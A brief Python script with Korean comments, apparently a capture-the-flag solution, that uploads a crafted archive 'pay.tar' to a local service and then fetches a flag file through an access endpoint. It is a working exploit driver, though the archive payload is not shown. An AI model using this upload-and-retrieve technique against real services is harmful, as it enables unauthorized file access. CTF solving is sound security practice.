import requests

HOST = 'http://localhost:13680'

session = requests.session() # 세션

header = {
    "Content-Type": "application/octet-stream", # 파일 받을때 쓰는 헤더
}

files = {
    'file':open("pay.tar", 'rb') # 파일 오픈
}

res = session.post(url=HOST+"/api/upload", files=files, verify=False) #업로드 

res = session.get(url=HOST+"/api/access/get_flag", headers=header, verify=False) #업로드한걸 받아옴.

print(res.text)
